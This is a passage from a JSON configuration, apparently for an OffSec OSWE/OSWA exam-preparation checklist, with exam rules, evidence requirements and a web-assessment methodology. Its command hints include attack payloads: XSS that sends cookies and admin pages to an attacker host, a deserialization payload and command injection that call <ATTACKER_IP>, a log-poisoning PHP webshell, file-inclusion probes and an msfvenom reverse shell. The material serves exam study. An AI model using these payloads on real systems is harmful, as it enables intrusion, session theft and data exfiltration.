     "text": "Open book: your own notes, online resources and the OffSec Learning Platform are permitted, but all activity must happen on the host running the proctoring application.",
     "enforceable": "",
     "source": "https://help.offsec.com/hc/en-us/articles/360046418812-OSWE-Exam-FAQ",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "Provide a single functional script per exam machine that exploits multiple vulnerabilities and executes WITHOUT user interaction. The grader must not have to do anything manually while it runs.",
     "enforceable": "require:poc-noninteractive",
     "source": "https://help.offsec.com/hc/en-us/articles/360046869951-WEB-300-Advanced-Web-Attacks-and-Exploitation-OSWE-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "text": "Before execution you may set up a netcat listener or an Apache web server. After execution, if you get a reverse shell you may grab the flags and run ifconfig/ipconfig manually.",
     "enforceable": "",
     "source": "https://help.offsec.com/hc/en-us/articles/360046869951-WEB-300-Advanced-Web-Attacks-and-Exploitation-OSWE-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "If you do NOT obtain a reverse shell, the PoC script must automatically extract the proof values.",
     "enforceable": "require:auto-proof",
     "source": "https://help.offsec.com/hc/en-us/articles/360046869951-WEB-300-Advanced-Web-Attacks-and-Exploitation-OSWE-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "Include the source code of your custom exploits in the documentation, as text inside the PDF (base64 of the script is also accepted). Do not upload the PoC as a separate file.",
     "enforceable": "require:poc-in-report",
     "source": "https://help.offsec.com/hc/en-us/articles/360046869951-WEB-300-Advanced-Web-Attacks-and-Exploitation-OSWE-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "limited",
     "text": "50 machine reverts. This limit can be reset once during the exam.",
     "enforceable": "budget:reverts:50",
     "source": "https://help.offsec.com/hc/en-us/articles/360046869951-WEB-300-Advanced-Web-Attacks-and-Exploitation-OSWE-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "Report submitted as a PDF archived in an unencrypted .7z named OSWE-OS-XXXXX-Exam-Report.7z (case-sensitive), max 200MB, uploaded to upload.offsec.com within 24 hours of the exam ending. Verify the MD5 and click Submit File.",
     "enforceable": "require:submission-format",
     "source": "https://help.offsec.com/hc/en-us/articles/360046869951-WEB-300-Advanced-Web-Attacks-and-Exploitation-OSWE-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "Retrieve local.txt and proof.txt and enter them in the Exam Control Panel before the exam ends; include screenshots proving remote access and showing the contents of these files in the report.",
     "enforceable": "require:control-panel-submit",
     "source": "https://help.offsec.com/hc/en-us/articles/360046418812-OSWE-Exam-FAQ",
     "confidence": "official"
    }
   ],
   "evidenceRules": [
    {
     "appliesTo": "*",
     "requirement": "Proof value entered into the Exam Control Panel before the exam clock expires — this is separate from, and additional to, the report.",
     "source": "https://help.offsec.com/hc/en-us/articles/360046418812-OSWE-Exam-FAQ",
     "confidence": "official"
    },
    {
     "appliesTo": "*",
     "requirement": "Screenshot showing the contents of the proof file as stated in the Exam Control Panel objectives. (FAQ wording: \"you must include screenshots that prove remote access showing the content of these files inside your exam report.\" The OSWE guide has no ifconfig-in-frame rule — unlike OSCP+ and OSEP — it only permits running ifconfig manually once you have a shell.)",
     "source": "https://help.offsec.com/hc/en-us/articles/360046869951-WEB-300-Advanced-Web-Attacks-and-Exploitation-OSWE-Exam-Guide",
     "confidence": "official"
    },
    {
     "appliesTo": "*",
     "requirement": "The method and code used to find each vulnerability, documented per vulnerability with the vulnerable source file and line.",
     "source": "https://www.offsec.com/awae/OSWE-Exam-Report.docx",
     "confidence": "official"
    },
    {
     "appliesTo": "*",
     "requirement": "A detailed, reproducible account of the steps taken to create the exploit — thorough enough for a technically competent reader to replicate step by step.",
     "source": "https://help.offsec.com/hc/en-us/articles/360046869951-WEB-300-Advanced-Web-Attacks-and-Exploitation-OSWE-Exam-Guide",
     "confidence": "official"
    },
    {
     "appliesTo": "oswe-t1-proof",
     "requirement": "Complete final PoC source code included as text (or base64) inside the report PDF, and the script must run to completion with no grader interaction.",
     "source": "https://help.offsec.com/hc/en-us/articles/360046869951-WEB-300-Advanced-Web-Attacks-and-Exploitation-OSWE-Exam-Guide",
     "confidence": "official"
    },
    {
     "appliesTo": "oswe-t2-proof",
     "requirement": "Complete final PoC source code included as text (or base64) inside the report PDF, and the script must run to completion with no grader interaction.",
     "source": "https://help.offsec.com/hc/en-us/articles/360046869951-WEB-300-Advanced-Web-Attacks-and-Exploitation-OSWE-Exam-Guide",
     "confidence": "official"
    },
    {
     "appliesTo": "oswe-t1-local",
     "requirement": "If no reverse shell is obtained, the PoC script must extract and print the proof value automatically.",
     "source": "https://help.offsec.com/hc/en-us/articles/360046869951-WEB-300-Advanced-Web-Attacks-and-Exploitation-OSWE-Exam-Guide",
     "confidence": "official"
    },
    {
     "appliesTo": "oswe-t2-local",
     "requirement": "If no reverse shell is obtained, the PoC script must extract and print the proof value automatically.",
     "source": "https://help.offsec.com/hc/en-us/articles/360046869951-WEB-300-Advanced-Web-Attacks-and-Exploitation-OSWE-Exam-Guide",
     "confidence": "official"
    }
   ],
   "reportSections": [
    "OffSec Web Expert Exam Report — introduction, scope and grading statement",
    "Target <TARGET_IP> — Local.txt / Proof.txt (contents of both files)",
    "Target <TARGET_IP> — Vulnerability 1 (method and code used to find it)",
    "Target <TARGET_IP> — Vulnerability 2 (method and code used to find it)",
    "Target <TARGET_IP> — Vulnerability X (repeat per additional vulnerability)",
    "Target <TARGET_IP> — PoC Code (final proof-of-concept used to gain access)",
    "Target <TARGET_IP> — Screenshots (local.txt and proof.txt contents per Control Panel objectives)",
    "Target <TARGET_IP> — Steps (detailed, reproducible methodology for creating the exploits)",
    "Additional Items Not Mentioned in the Report"
   ],
   "sources": [
    "https://help.offsec.com/hc/en-us/articles/360046869951-WEB-300-Advanced-Web-Attacks-and-Exploitation-OSWE-Exam-Guide",
    "https://help.offsec.com/hc/en-us/articles/360046418812-OSWE-Exam-FAQ",
    "https://www.offsec.com/awae/OSWE-Exam-Report.docx",
    "https://www.offsec.com/courses/web-300/"
   ],
   "unverified": [
    "Number of exam targets and the per-objective point split. The exam guide says only \"several target machines\" and confirms a 100-point maximum with 85 to pass; it does not publish how many targets there are or how the points divide. This preset therefore models two targets — the count candidates consistently report — and deliberately carries NO point values. Take them from your Exam Control Panel.",
    "The guide bans 'source code analyzers' without defining the term. Automated SAST products (Semgrep, SonarQube, Snyk, Fortify, CodeQL) are clearly within the ban. Manual pattern searching with grep/ripgrep is universally treated by candidates as manual code review rather than an analyzer, but OffSec has not stated this in writing — every ripgrep command in this preset rests on that community reading, not an official ruling. Confirm with OffSec if you want certainty.",
    "Whether Burp Suite Professional is permitted. The OSWE guide lists 'Burp Free' among permitted tools and, unlike the OSWA guide, carries no general 'commercial tools or services' ban — but it does not explicitly authorise Burp Professional either.",
    "Which languages appear on any given exam sitting. The WEB-300 course page confirms JavaScript, PHP, Java and C# are taught; Python is listed only as a scripting language for writing your own exploits. The Python sink coverage in the static-analysis phase is included as general whitebox methodology, not as a claim that Python targets appear on the exam."
   ],
   "pointsUnknown": true,
   "notes": [
    "sqlmap is banned on OSWE and explicitly allowed on OSWA. Check which exam you are sitting.",
    "The graded deliverable is a single standalone exploit script per target that chains the authentication bypass into remote code execution. Build it as a deliverable in its own right: non-interactive, parameterised target, survives a revert, deterministic artifact names, and a useful message when it dies at step 3 of 5."
   ],
   "kind": "targets",
   "appFeatures": []
  },
  {
   "id": "oswa",
   "name": "OSWA (WEB-200)",
   "icon": "🕸️",
   "tagline": "Blackbox web assessment across five independent targets — no source, no debugger, breadth and speed instead of one deep chain (the exact inverse of OSWE).",
   "focus": "webapp",
   "durationMin": 1425,
   "reportHours": 24,
   "passMark": 70,
   "totalPoints": 100,
   "scoringNote": "Five independent targets, each containing a local.txt and a proof.txt. Each flag is worth 10 points, so 5 targets x 2 flags x 10 = 100 points, and 70 points (seven flags) passes. Points are awarded for partial and full completion of the exam objectives, and each specific set of objectives must be met for full points. Each flag is worth 10 points (stated in the FAQ) across 5 independent targets each carrying local.txt and proof.txt, for a 100-point maximum.",
   "targets": [
    {
     "key": "oswa-1",
     "label": "Exam Target 1 — web application (blackbox)",
     "kind": "webapp",
     "points": 20,
     "flags": [
      {
       "id": "oswa-1-local",
       "label": "local.txt (visible in the web app's administration section)",
       "points": 10
      },
      {
       "id": "oswa-1-proof",
       "label": "proof.txt (usually the filesystem root — / or C:\\ — or the home directory of an exploited process or user)",
       "points": 10
      }
     ]
    },
    {
     "key": "oswa-2",
     "label": "Exam Target 2 — web application (blackbox)",
     "kind": "webapp",
     "points": 20,
     "flags": [
      {
       "id": "oswa-2-local",
       "label": "local.txt (visible in the web app's administration section)",
       "points": 10
      },
      {
       "id": "oswa-2-proof",
       "label": "proof.txt (usually the filesystem root — / or C:\\ — or the home directory of an exploited process or user)",
       "points": 10
      }
     ]
    },
    {
     "key": "oswa-3",
     "label": "Exam Target 3 — web application (blackbox)",
     "kind": "webapp",
     "points": 20,
     "flags": [
      {
       "id": "oswa-3-local",
       "label": "local.txt (visible in the web app's administration section)",
       "points": 10
      },
      {
       "id": "oswa-3-proof",
       "label": "proof.txt (usually the filesystem root — / or C:\\ — or the home directory of an exploited process or user)",
       "points": 10
      }
     ]
    },
    {
     "key": "oswa-4",
     "label": "Exam Target 4 — web application (blackbox)",
     "kind": "webapp",
     "points": 20,
     "flags": [
      {
       "id": "oswa-4-local",
       "label": "local.txt (visible in the web app's administration section)",
       "points": 10
      },
      {
       "id": "oswa-4-proof",
       "label": "proof.txt (usually the filesystem root — / or C:\\ — or the home directory of an exploited process or user)",
       "points": 10
      }
     ]
    },
    {
     "key": "oswa-5",
     "label": "Exam Target 5 — web application (blackbox)",
     "kind": "webapp",
     "points": 20,
     "flags": [
      {
       "id": "oswa-5-local",
       "label": "local.txt (visible in the web app's administration section)",
       "points": 10
      },
      {
       "id": "oswa-5-proof",
       "label": "proof.txt (usually the filesystem root — / or C:\\ — or the home directory of an exploited process or user)",
       "points": 10
      }
     ]
    }
   ],
   "phases": [
    {
     "id": "oswa-recon",
     "name": "Recon & Application Mapping",
     "goal": "Every host, port, vhost, endpoint and parameter across all five targets is written down before you commit hours to any single one.",
     "items": [
      {
       "label": "This is a BLACKBOX exam and that changes everything. You get no source, no debugger and no breakpoints — every conclusion is inferred from responses, error strings, timing and client-side code. OSWE is one deep chain through code you can read; OSWA is five shallow-to-medium chains you have to feel out from outside",
       "hint": ""
      },
      {
       "label": "Plan for breadth. 23h45m across five targets is under five hours each including the report notes — a target that has not moved in 90 minutes goes to the back of the queue",
       "hint": ""
      },
      {
       "label": "Port and service sweep every target first, then stop enumerating and start testing — the points are in the applications, not the ports",
       "hint": "nmap -sC -sV -p- --min-rate 2000 -oA nmap/<TARGET_IP> <TARGET_IP>"
      },
      {
       "label": "Some targets serve HTTPS with self-signed certificates — accept them in the browser or proxy through Burp, which replaces them with a trusted cert",
       "hint": ""
      },
      {
       "label": "Fingerprint the stack from response headers, cookie names, error pages and the favicon hash",
       "hint": "curl -skI <TARGET_URL>"
      },
      {
       "label": "Virtual host and subdomain discovery — a missed vhost is a missed target",
       "hint": "ffuf -u http://<TARGET_IP>/ -H 'Host: FUZZ.<DOMAIN>' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac"
      },
      {
       "label": "Content discovery with extensions matched to the fingerprinted stack, not a generic list",
       "hint": "feroxbuster -u <TARGET_URL> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,aspx,jsp,txt,bak,zip,old -k"
      },
      {
       "label": "Nikto for the cheap misconfigurations while you read the site by hand",
       "hint": "nikto -h <TARGET_URL> -ssl"
      },
      {
       "label": "Read the client-side code properly: JS bundles, source maps, HTML comments, API base paths, hardcoded keys, and endpoints the UI never calls",
       "hint": "curl -sk <TARGET_URL>/main.js | rg -n -i 'api|/v[0-9]/|token|secret|key|endpoint|admin|debug'"
      },
      {
       "label": "Spider with Burp, then work from the site map. Every parameter in it is a test candidate — build the list before you start guessing",
       "hint": ""
      },
      {
       "label": "Register an account wherever registration exists, then diff what an authenticated user sees against an anonymous one. The delta is your attack surface",
       "hint": ""
      },
      {
       "label": "Write down each target's role model — anonymous, user, admin — and note that local.txt lives behind the admin role on every target",
       "hint": ""
      },
      {
       "label": "Check robots.txt, sitemap.xml, .git, .svn, backup files and directory listings before anything clever",
       "hint": "curl -sk <TARGET_URL>/robots.txt; curl -sk <TARGET_URL>/.git/HEAD"
      }
     ]
    },
    {
     "id": "oswa-auth",
     "name": "Authentication, Session & Access Control",
     "goal": "You know how the app proves identity, and you have found where it forgets to check it.",
     "items": [
      {
       "label": "Test the login form for SQL injection, NoSQL operator injection and LDAP injection before you consider brute forcing anything",
       "hint": ""
      },
      {
       "label": "SQLMap IS permitted on this exam (unlike OSWE) — use it on captured requests, but reproduce findings manually for the report",
       "hint": "sqlmap -r req.txt --batch --level=3 --risk=2 --dbs"
      },
      {
       "label": "Username enumeration via response-body differences, status codes or timing on login, registration and password reset",
       "hint": ""
      },
      {
       "label": "Inspect the session cookie: structured, base64, signed, or a JWT? Decode it before assuming it is opaque",
       "hint": "echo '<HASH>' | base64 -d | xxd | head"
      },
      {
       "label": "JWT checks in order: alg none, algorithm confusion (RS256 verified as HS256), missing signature verification, then a weak HMAC secret",
       "hint": "hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt"
      },
      {
       "label": "IDOR on every identifier you can see — numeric ids, usernames, UUIDs, filenames. Always verify with a second account, not just by changing your own value",
       "hint": ""
      },
      {
       "label": "Forced browsing: hit admin routes with a low-privilege session. Missing function-level access control is one of the most common paths to local.txt here",
       "hint": ""
      },
      {
       "label": "Password reset logic: predictable or sequential tokens, token not bound to the requesting account, token never expiring or reusable, and reset links built from the Host header",
       "hint": "curl -sk <TARGET_URL>/reset -H 'Host: <ATTACKER_IP>' -d 'email=<USER>'"
      },
      {
       "label": "Registration flaws: a role or isAdmin field accepted from the request, email/username collision, unverified email accepted as identity",
       "hint": ""
      },
      {
       "label": "Test whether a tampered or unsigned cookie is accepted, and whether the app falls back to a default role when the session is malformed",
       "hint": ""
      },
      {
       "label": "Credential reuse: anything you recover on one target gets tried on all five, and against SSH",
       "hint": ""
      }
     ]
    },
    {
     "id": "oswa-injection",
     "name": "Server-Side Injection",
     "goal": "Every input that reaches an interpreter — SQL, shell, template, XML, deserializer — is identified and exploited.",
     "items": [
      {
       "label": "SQL injection in all four shapes: error-based, UNION, boolean-blind, time-blind — plus second-order, where input is stored and injected somewhere else entirely",
       "hint": "sqlmap -r req.txt --batch --level=5 --risk=3 --technique=BEUSTQ"
      },
      {
       "label": "Do not forget the non-obvious injection points: HTTP headers, cookies, JSON bodies, XML bodies, and ORDER BY / column-name positions that break parameterisation",
       "hint": "sqlmap -r req.txt --batch --level=5   # level 5 reaches headers and cookies"
      },
      {
       "label": "Command injection — test the separator set, then confirm blind cases out of band",
       "hint": "curl -sk '<TARGET_URL>/ping?host=127.0.0.1%3Bcurl+http%3A%2F%2F<ATTACKER_IP>%3A<PORT>%2Fhit'"
      },
      {
       "label": "Keep an out-of-band listener running for the whole exam so a blind hit is never missed",
       "hint": "python3 -m http.server <PORT>"
      },
      {
       "label": "Server-side template injection: fingerprint the engine with an arithmetic probe first, then escalate with the engine-specific escape",
       "hint": "curl -sk '<TARGET_URL>/?name=%7B%7B7*7%7D%7D'"
      },
      {
       "label": "Tplmap is permitted on this exam",
       "hint": "tplmap -u '<TARGET_URL>/?name=*'"
      },
      {
       "label": "XXE anywhere XML is accepted — including SOAP endpoints, SVG uploads, DOCX/XLSX uploads, and JSON endpoints that also accept application/xml if you switch the Content-Type",
       "hint": "curl -sk <TARGET_URL>/api -H 'Content-Type: application/xml' --data-binary @xxe.xml"
      },
      {
       "label": "Blind XXE via an external DTD hosted on your own box when the parser returns no output",
       "hint": "python3 -m http.server <PORT>   # serve evil.dtd and catch the parameter-entity exfil"
      },
      {
       "label": "Deserialization on any parameter that looks serialized — Java base64 starts rO0AB, PHP starts O: or a:, .NET starts AAEAAAD",
       "hint": "java -jar ysoserial.jar CommonsCollections6 'curl http://<ATTACKER_IP>:<PORT>/hit' | base64 -w0"
      },
      {
       "label": "Header injection into logs, SQL and templates: Host, X-Forwarded-For, Referer and User-Agent are inputs too",
       "hint": ""
      },
      {
       "label": "CRLF injection and response splitting on anything reflected into a header, especially redirect targets",
       "hint": ""
      }
     ]
    },
    {
     "id": "oswa-clientside",
     "name": "Client-Side & Cross-User Attacks",
     "goal": "Turn an emulated user's browser into your route to the administration area.",
     "items": [
      {
       "label": "Some targets run emulated users that visit pages at regular intervals — the guide says explicitly you may target them. A stored XSS aimed at an admin is an intended path, not a long shot",
       "hint": ""
      },
      {
       "label": "Identify every reflection point AND its context: HTML body, tag attribute, JS string literal, URL, or a DOM sink. The context decides the payload, not a wordlist",
       "hint": ""
      },
      {
       "label": "Stored XSS in anything an administrator reads: profile fields, support tickets, comments, filenames, contact forms, and admin log viewers that render the User-Agent",
       "hint": ""
      },
      {
       "label": "Cookie theft to your own listener, once you know the cookie is not HttpOnly",
       "hint": "<img src=x onerror=\"fetch('http://<ATTACKER_IP>:<PORT>/?c='+document.cookie)\">"
      },
      {
       "label": "If the session cookie is HttpOnly, steal the ACTION instead of the cookie: make the admin's browser issue the privileged request for you and exfiltrate the response",
       "hint": "<script>fetch('/admin/users',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('http://<ATTACKER_IP>:<PORT>/?d='+btoa(t)))</script>"
      },
      {
       "label": "CSRF on state-changing admin functions where no token is validated, the token is not bound to the session, or the check is skipped when the token is absent entirely",
       "hint": ""
      },
      {
       "label": "CORS misconfiguration — a reflected Origin combined with Access-Control-Allow-Credentials lets you read authenticated responses cross-origin",
       "hint": "curl -skI -H 'Origin: https://evil.<DOMAIN>' <TARGET_URL>/api/me"
      },
      {
       "label": "DOM XSS: trace location, hash, referrer and postMessage data into innerHTML, document.write, eval and jQuery sinks",
       "hint": ""
      },
      {
       "label": "Bypass filters by understanding what they strip, not by pasting a list: alternate event handlers, encoding layers, tag and attribute variants, and mutation XSS",
       "hint": ""
      },
      {
       "label": "Host the payload and catch the callback on one listener so you can tell which injection point fired",
       "hint": "php -S 0.0.0.0:<PORT>"
      }
     ]
    },
    {
     "id": "oswa-files",
     "name": "File & Request Abuse",
     "goal": "Read files you should not be able to read, reach hosts you should not be able to reach, and get a file of your choosing onto the server.",
     "items": [
      {
       "label": "Directory traversal on every path-like parameter, including double URL-decoding, encoded slashes and null-byte variants on older stacks",
       "hint": "ffuf -u '<TARGET_URL>/download?file=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -ac"
      },
      {
       "label": "Local file inclusion: read the application's own config files first — database credentials there usually unlock the admin account directly",
       "hint": "curl -sk '<TARGET_URL>/?page=../../../../etc/passwd'"
      },
      {
       "label": "PHP wrappers for source disclosure, which is the closest thing to whitebox you will get on this exam",
       "hint": "curl -sk '<TARGET_URL>/?page=php://filter/convert.base64-encode/resource=config' | base64 -d"
      },
      {
       "label": "LFI to RCE paths: log poisoning via User-Agent, /proc/self/environ, PHP session files, and uploaded files reachable by path",
       "hint": "curl -sk <TARGET_URL> -H 'User-Agent: <?php system($_GET[0]); ?>'"
      },
      {
       "label": "Remote file inclusion where allow_url_include is on — rarer, but cheap to test",
       "hint": "curl -sk '<TARGET_URL>/?page=http://<ATTACKER_IP>:<PORT>/shell.txt'"
      },
      {
       "label": "File upload: test the extension check, the Content-Type check and the magic-byte check INDEPENDENTLY — they are usually not all present",
       "hint": ""
      },
      {
       "label": "An upload only matters if you can reach it over HTTP. Find the storage path before you spend time on the bypass",
       "hint": ""
      },
      {
       "label": "SSRF: internal port scanning, cloud metadata endpoints, and protocol smuggling via gopher, file and dict",
       "hint": "curl -sk '<TARGET_URL>/fetch?url=http://127.0.0.1:<PORT>/'"
      },
      {
       "label": "SSRF filter bypasses: decimal and octal IP forms, your own 302 redirect, DNS rebinding, IPv6 literals, and an @ in the authority",
       "hint": "curl -sk '<TARGET_URL>/fetch?url=http://2130706433/'"
      },
      {
       "label": "Anything you can read is a credential source: config files, .env, web.config, backup archives, git objects, and user home directories",
       "hint": ""
      }
     ]
    },
    {
     "id": "oswa-foothold",
     "name": "Admin Session, local.txt and proof.txt",
     "goal": "An authenticated administrator session and local.txt on the web side, then a shell on the host and proof.txt.",
     "items": [
      {
       "label": "The stated objective on every target: exploit the web application to gain an authenticated administrator session, then obtain proof.txt from the server",
       "hint": ""
      },
      {
       "label": "local.txt is visible inside the administration section of the web application — capture it the second you get admin, before doing anything that might break the session",
       "hint": ""
      },
      {
       "label": "Escalate from admin functionality to code execution: file upload, plugin or theme installation, template editor, backup restore, configuration write, or a 'test connection' field that shells out",
       "hint": ""
      },
      {
       "label": "Generate the payload with msfvenom — payload generators are permitted, automatic exploitation is not",
       "hint": "msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.php"
      },
      {
       "label": "Catch the shell",
       "hint": "rlwrap nc -lvnp <LPORT>"
      },
      {
       "label": "Upgrade to a usable TTY before you start navigating the filesystem",
       "hint": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'; export TERM=xterm; stty raw -echo; fg"
      },
      {
       "label": "proof.txt is in the filesystem root (/ on Linux, C:\\ on Windows) or the home directory of the exploited process or user",
       "hint": "cat /proof.txt 2>/dev/null; ls -la ~; type C:\\proof.txt"
      },
      {
       "label": "No privilege escalation is required after you obtain a remote shell. If proof.txt is not readable as the web user, check the process's own home directory before assuming you need to escalate — do not burn hours on privesc you are not being scored on",
       "hint": ""
      },
      {
       "label": "Bank the flag immediately: submit it in the Exam Control Panel, then move to the next target",
       "hint": ""
      },
      {
       "label": "Timebox ruthlessly. Seven flags out of ten passes — two fully solved targets plus three local.txt values is a pass",
       "hint": ""
      }
     ]
    },
    {
     "id": "oswa-report",
     "name": "Proof Capture & Reporting",
     "goal": "All proof values in the Control Panel before the clock stops, and a PDF a stranger can replicate step by step.",
     "items": [
      {
       "label": "Submit every local.txt and proof.txt value in the Exam Control Panel BEFORE the exam ends. The panel will not tell you whether a value is correct, so double-check what you paste",
       "hint": ""
      },
      {
       "label": "Proof obtained through the web UI: screenshot BOTH your web proxy (Burp) and the browser showing the value on the actual target machine",
       "hint": ""
      },
      {
       "label": "Proof obtained through a shell: screenshot the contents of the proof file with cat or type, from its ORIGINAL location — not copied elsewhere",
       "hint": "ip a; cat /proof.txt"
      },
      {
       "label": "Missing proof screenshots means zero points for that target regardless of what you actually achieved",
       "hint": ""
      },
      {
       "label": "Document each vulnerability per target with the method and the reproducible steps used to find and exploit it",
       "hint": ""
      },
      {
       "label": "Export to PDF and re-read it — once submitted you cannot send anything you forgot, and OffSec will not ask",
       "hint": ""
      },
      {
       "label": "Package with the exact case-sensitive filename, unencrypted, under 200MB",
       "hint": "7z a OSWA-OS-XXXXX-Exam-Report.7z OSWA-OS-XXXXX-Exam-Report.pdf && md5sum OSWA-OS-XXXXX-Exam-Report.7z"
      },
      {
       "label": "Upload to upload.offsec.com within 24 hours, verify the MD5 matches your local hash, click Submit File, and confirm the acknowledgement email",
       "hint": ""
      }
     ]
    }
   ],
   "rules": [
    {
     "kind": "banned",
     "text": "Spoofing of any kind (IP, ARP, DNS, NBNS, etc.).",
     "enforceable": "ban:spoofing",
     "source": "https://help.offsec.com/hc/en-us/articles/4410105650964-WEB-200-Foundational-Web-Application-Assessments-with-Kali-Linux-OSWA-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "Commercial tools or services (Metasploit Pro, Burp Suite Enterprise Edition, etc.).",
     "enforceable": "ban:commercial",
     "source": "https://help.offsec.com/hc/en-us/articles/4410105650964-WEB-200-Foundational-Web-Application-Assessments-with-Kali-Linux-OSWA-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "Automatic exploitation tools (e.g. db_autopwn, browser_autopwn, etc.).",
     "enforceable": "ban:autoexploit",
     "source": "https://help.offsec.com/hc/en-us/articles/4410105650964-WEB-200-Foundational-Web-Application-Assessments-with-Kali-Linux-OSWA-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "Mass vulnerability scanners (e.g. Nessus, NeXpose, OpenVAS, Canvas, Core Impact, SAINT, etc.).",
     "enforceable": "ban:scanners",
     "source": "https://help.offsec.com/hc/en-us/articles/4410105650964-WEB-200-Foundational-Web-Application-Assessments-with-Kali-Linux-OSWA-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "AI chatbots and LLMs with direct prompt access (ChatGPT, OffSec KAI, Gemini, Deepseek, etc.) — treated as third-party help under the Academic Policy. Tools with incidental built-in AI features (Notion, Google AI Overview) need not be disabled.",
     "enforceable": "ban:ai",
     "source": "https://help.offsec.com/hc/en-us/articles/4410105650964-WEB-200-Foundational-Web-Application-Assessments-with-Kali-Linux-OSWA-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "Features in other tools that utilise either forbidden or restricted exam limitations.",
     "enforceable": "",
     "source": "https://help.offsec.com/hc/en-us/articles/4410105650964-WEB-200-Foundational-Web-Application-Assessments-with-Kali-Linux-OSWA-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "Downloading any applications, files or source code from the exam environment to your local machine is strictly forbidden.",
     "enforceable": "ban:exfil",
     "source": "https://help.offsec.com/hc/en-us/articles/4410105650964-WEB-200-Foundational-Web-Application-Assessments-with-Kali-Linux-OSWA-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "Seeking or receiving assistance from other people, including on Discord. Searching Discord for information is permitted; asking for help is not.",
     "enforceable": "",
     "source": "https://help.offsec.com/hc/en-us/articles/4410105650964-WEB-200-Foundational-Web-Application-Assessments-with-Kali-Linux-OSWA-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "text": "sqlmap, sqlninja and similar tools ARE allowed on OSWA (unlike OSCP and OSWE). They are not required to pass. If you use them you must still meet the documentation requirements in your report — raw sqlmap output is not a write-up.",
     "enforceable": "",
     "source": "https://help.offsec.com/hc/en-us/articles/4410105650964-WEB-200-Foundational-Web-Application-Assessments-with-Kali-Linux-OSWA-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "text": "Nmap (including NSE), Nikto, Burp Suite Community or Professional, DirBuster, and payload generator tools such as msfvenom and ysoserial may be used against any target.",
     "enforceable": "",
     "source": "https://help.offsec.com/hc/en-us/articles/4410105650964-WEB-200-Foundational-Web-Application-Assessments-with-Kali-Linux-OSWA-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "text": "Emulated users visit certain pages at regular intervals on some targets, and you may target them to attack the applications.",
     "enforceable": "",
     "source": "https://help.offsec.com/hc/en-us/articles/4410105650964-WEB-200-Foundational-Web-Application-Assessments-with-Kali-Linux-OSWA-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "text": "Open book: your own notes, online resources and the OffSec Learning Platform are permitted, but all activity must happen on the host running the proctoring application.",
     "enforceable": "",
     "source": "https://help.offsec.com/hc/en-us/articles/7281947451284-OSWA-Exam-FAQ",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "text": "Privilege escalation is NOT required after obtaining a remote shell — proof.txt is reachable as the exploited user.",
     "enforceable": "",
     "source": "https://help.offsec.com/hc/en-us/articles/4410105650964-WEB-200-Foundational-Web-Application-Assessments-with-Kali-Linux-OSWA-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "limited",
     "text": "24 machine reverts. This limit can be reset once during the exam. This limit can be reset once during the exam.",
     "enforceable": "budget:reverts:24;reset:1",
     "source": "https://help.offsec.com/hc/en-us/articles/4410105650964-WEB-200-Foundational-Web-Application-Assessments-with-Kali-Linux-OSWA-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "The contents of local.txt and proof.txt must be submitted in the Exam Control Panel before the exam has ended. The panel does not indicate whether a submitted proof is correct.",
     "enforceable": "require:control-panel-submit",
     "source": "https://help.offsec.com/hc/en-us/articles/4410105650964-WEB-200-Foundational-Web-Application-Assessments-with-Kali-Linux-OSWA-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "Report submitted as a PDF archived in an unencrypted .7z named OSWA-OS-XXXXX-Exam-Report.7z (case-sensitive), max 200MB, uploaded to upload.offsec.com within 24 hours of the exam ending. Verify the MD5 and click Submit File.",
     "enforceable": "require:submission-format",
     "source": "https://help.offsec.com/hc/en-us/articles/4410105650964-WEB-200-Foundational-Web-Application-Assessments-with-Kali-Linux-OSWA-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "required",
     "confidence": "official",
     "text": "Burp Suite Professional is allowed on OSWA. Plugins that do not perform restricted actions are allowed — but any Burp plugin you use during the exam MUST be documented in your report.",
     "enforceable": "report:document:burp-plugins",
     "source": "https://help.offsec.com/hc/en-us/articles/7281947451284-OSWA-Exam-FAQ"
    }
   ],
   "evidenceRules": [
    {
     "appliesTo": "*",
     "capturedVia": "web",
     "requirement": "If you obtained the proof value THROUGH THE WEB UI, you must provide screenshots of Burp Suite (or any web proxy) and your browser showing how it was obtained.",
     "source": "https://help.offsec.com/hc/en-us/articles/4410105650964-WEB-200-Foundational-Web-Application-Assessments-with-Kali-Linux-OSWA-Exam-Guide",
     "confidence": "official"
    },
    {
     "appliesTo": "*",
     "capturedVia": "shell",
     "requirement": "If you obtained the proof value THROUGH A SHELL, you must screenshot the contents of the proof files with `type` or `cat`, read from their original location.",
